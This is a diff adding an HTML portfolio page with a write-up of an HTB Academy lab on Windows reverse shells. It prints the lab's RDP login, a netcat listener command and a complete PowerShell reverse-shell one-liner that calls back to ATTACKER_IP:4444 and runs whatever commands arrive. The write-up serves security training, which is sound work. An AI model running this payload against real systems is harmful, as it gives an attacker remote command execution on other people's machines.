@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reverse Shells – ACADEMY-SHELLS-WIN10 - DragonRingki Cybersecurity</title>
+    <meta name="description" content="HTB Academy reverse shell lab on ACADEMY-SHELLS-WIN10 - a focused writeup on Windows reverse shells by Matthew (DragonRingki).">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        /* Writeup-specific styles */
+        .writeup-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 30px;
+            background: rgba(26, 31, 46, 0.8);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .writeup-meta {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .meta-badge {
+            background: var(--gradient-accent);
+            color: var(--primary-dark);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        
+        .writeup-content {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .section {
+            margin: 30px 0;
+            padding: 25px;
+            background: rgba(26, 31, 46, 0.6);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .section h3 {
+            color: var(--accent-cyan);
+            margin-bottom: 15px;
+            border-bottom: 2px solid var(--accent-cyan);
+            padding-bottom: 10px;
+        }
+        
+        .command-block {
+            background: var(--primary-darker);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            position: relative;
+        }
+        
+        .command-block::before {
+            content: '$';
+            position: absolute;
+            top: 20px;
+            left: 15px;
+            color: var(--accent-green);
+            font-weight: bold;
+        }
+        
+        .command-block code {
+            margin-left: 20px;
+            background: none;
+            color: var(--accent-green);
+            white-space: pre-wrap;
+        }
+        
+        .highlight-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid var(--accent-cyan);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .warning-box {
+            background: rgba(255, 107, 53, 0.1);
+            border-left: 4px solid var(--accent-orange);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .success-box {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid var(--accent-green);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: var(--accent-cyan);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        .back-link:hover {
+            color: var(--accent-green);
+            transform: translateX(-5px);
+        }
+        
+        .back-link::before {
+            content: '← ';
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div id="sidebar">
+        <nav>
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../about.html">About Me</a></li>
+                <li><a href="../portfolio.html">Portfolio</a></li>
+                <li><a href="../contact.html">Contact</a></li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="content">
+        <a href="../portfolio.html" class="back-link">Back to Portfolio</a>
+        
+        <div class="writeup-header">
+            <h1>Reverse Shells – HTB Academy ACADEMY-SHELLS-WIN10</h1>
+            <div class="writeup-meta">
+                <span class="meta-badge">Difficulty: Intro / Learning</span>
+                <span class="meta-badge">Category: Tactics / Shells</span>
+                <span class="meta-badge">Platform: HTB Academy (Windows 10)</span>
+                <span class="meta-badge">Date: March 2026</span>
+            </div>
+            <p>Short focused lab on understanding reverse shells from a Windows 10 host in HTB Academy, using netcat listeners and PowerShell payloads to get command execution back to my attack box.</p>
+        </div>
+
+        <div class="writeup-content">
+            <!-- Overview Section -->
+            <div class="section">
+                <h3>📋 Overview</h3>
+                <p>
+                    This lab is part of the HTB Academy “Shells &amp; Payloads” module. 
+                    The goal here is simple: prove I understand what a reverse shell is, set up a 
+                    listener on my attack box, fire a PowerShell reverse shell from ACADEMY-SHELLS-WIN10,
+                    and use the session to retrieve the hostname (<code>shells-Win10</code>).
+                </p>
+            </div>
+
+            <!-- Reconnaissance Section -->
+            <div class="section">
+                <h3>🔍 Reconnaissance</h3>
+                <p>
+                    Since this is an Academy lab, the “recon” is mostly environment awareness:
+                    confirm connectivity, log into the Windows target, and identify my own VPN IP
+                    for the reverse shell callback.
+                </p>
+                
+                <div class="command-block">
+                    <code>ip a | grep tun0</code>
+                </div>
+                
+                <div class="highlight-box">
+                    <strong>Key Finding:</strong> My tun0 interface IP is used as <code>LHOST</code> / <code>ATTACKER_IP</code> 
+                    in all reverse shell payloads. The Windows target must call back to this address, not 127.0.0.1 or its own IP.
+                </div>
+            </div>
+
+            <!-- Enumeration Section -->
+            <div class="section">
+                <h3>🔎 Enumeration</h3>
+                <p>
+                    The Academy instructions give direct RDP access to the Windows 10 lab host:
+                </p>
+                <ul>
+                    <li>Target IP: <code>10.129.11.9</code></li>
+                    <li>Hostname (later confirmed via reverse shell): <code>shells-Win10</code></li>
+                    <li>Service: RDP (supplied by the lab)</li>
+                    <li>Credentials: <code>htb-student / HTB_@cademy_stdnt!</code></li>
+                </ul>
+                
+                <div class="command-block">
+                    <code># From my local machine / Pwnbox (using the RDP client provided by HTB or xfreerdp)<br>
+xfreerdp /u:htb-student /p:"HTB_@cademy_stdnt!" /v:10.129.11.9</code>
+                </div>
+            </div>
+
+            <!-- Exploitation Section -->
+            <div class="section">
+                <h3>⚡ Exploitation</h3>
+                <p>
+                    The “exploit” here is just abusing the fact I have an interactive session on Windows.
+                    I start a netcat listener on my attack box, then run a PowerShell reverse shell one-liner 
+                    from the RDP session back to that listener.
+                </p>
+                
+                <div class="warning-box">
+                    <strong>⚠️ Important:</strong> In a <strong>reverse shell</strong>, the <em>victim</em> (Windows box) 
+                    acts as the <strong>client</strong> and initiates the connection out to my <strong>listener</strong> 
+                    (attacker = server). This is the opposite of a bind shell.
+                </div>
+                
+                <p><strong>1) Start listener on attack box</strong></p>
+                <div class="command-block">
+                    <code># On my HTB attack box (Kali / Pwnbox)<br>
+nc -lvnp 4444</code>
+                </div>
+
+                <p><strong>2) Trigger PowerShell reverse shell from ACADEMY-SHELLS-WIN10</strong></p>
+                <p>In the RDP session, open PowerShell or CMD and run the following, replacing <code>ATTACKER_IP</code> with my tun0 IP:</p>
+                <div class="command-block">
+                    <code>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"</code>
+                </div>
+
+                <div class="highlight-box">
+                    <strong>Key Behaviour:</strong> Once the command runs, the Windows box opens a TCP connection to 
+                    <code>ATTACKER_IP:4444</code>, and wires that connection to a PowerShell process. Anything I type 
+                    into netcat is executed on the Windows host.
+                </div>
+            </div>
+
+            <!-- Post-Exploitation Section -->
+            <div class="section">
+                <h3>🎯 Post-Exploitation</h3>
+                <p>
+                    After the connection hits my listener, I have a basic interactive PowerShell session.
+                    The lab question asks for the hostname of the target machine, which I can now grab over the reverse shell.
+                </p>
+                
+                <div class="command-block">
+                    <code># In the netcat session on my attack box<br>
+hostname</code>
+                </div>
+
+                <div class="success-box">
+                    <strong>✅ Success:</strong> The command returned <code>shells-Win10</code>, confirming both that the 
+                    reverse shell worked and that the target host’s name matches the lab question.
+                </div>
+            </div>
+
+            <!-- Key Learnings Section -->
+            <div class="section">
+                <h3>📚 Key Learnings</h3>
+                <ul>
+                    <li>In a reverse shell, the <strong>target is the client</strong>, the <strong>attacker is the server/listener</strong>.</li>
+                    <li>Always use your <strong>VPN/tun0 IP</strong> for <code>LHOST</code> in HTB labs, not localhost or the target’s IP.</li>
+                    <li>A simple <strong>netcat listener + PowerShell one-liner</strong> is enough to get a usable reverse shell on Windows.</li>
+                    <li>Once you have any shell, basic commands like <code>hostname</code> can verify context and answer lab questions quickly.</li>
+                </ul>
+            </div>
+
+            <!-- Tools Used Section -->
+            <div class="section">
+                <h3>🛠️ Tools Used</h3>
+                <ul>
+                    <li><strong>Netcat (nc):</strong> Used as a TCP listener on my attack box to catch the reverse shell connection.</li>
+                    <li><strong>PowerShell:</strong> Built-in on Windows 10, used to create the reverse TCP connection back to my listener.</li>
+                    <li><strong>RDP client / xfreerdp:</strong> To interact with the Windows 10 lab host (ACADEMY-SHELLS-WIN10).</li>
+                </ul>
+            </div>
+
+            <!-- References Section -->
+            <div class="section">
+                <h3>📖 References</h3>
+                <ul>
+                    <li><a href="https://academy.hackthebox.com/" target="_blank">HTB Academy – Shells &amp; Payloads Module</a></li>
+                    <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation#reverse-shells" target="_blank">PayloadsAllTheThings – Windows Reverse Shells</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+</html>
